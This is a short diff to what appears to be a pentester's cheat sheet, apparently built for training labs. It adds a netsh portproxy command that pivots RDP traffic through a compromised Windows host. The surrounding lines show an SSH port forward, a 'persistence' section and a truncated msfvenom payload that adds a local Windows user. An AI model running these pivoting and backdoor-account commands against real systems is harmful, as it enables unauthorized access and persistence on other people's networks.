@@ -143,6 +143,7 @@ export PATH=.:$PATH
 ## rdp diferent network
   ```
   ssh -L 9001:target:3389 ubuntu@10.129.252.169
+  netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.25
   ```
 ## persistence
   ```
@@ -281,6 +282,7 @@ msfvenom -a x86 --platform Windows -p windows/exec CMD="net user /add lopsy a123
   krbrelayx
   gdb-peda-pwndbg-gef
   ```
+
 
 
 
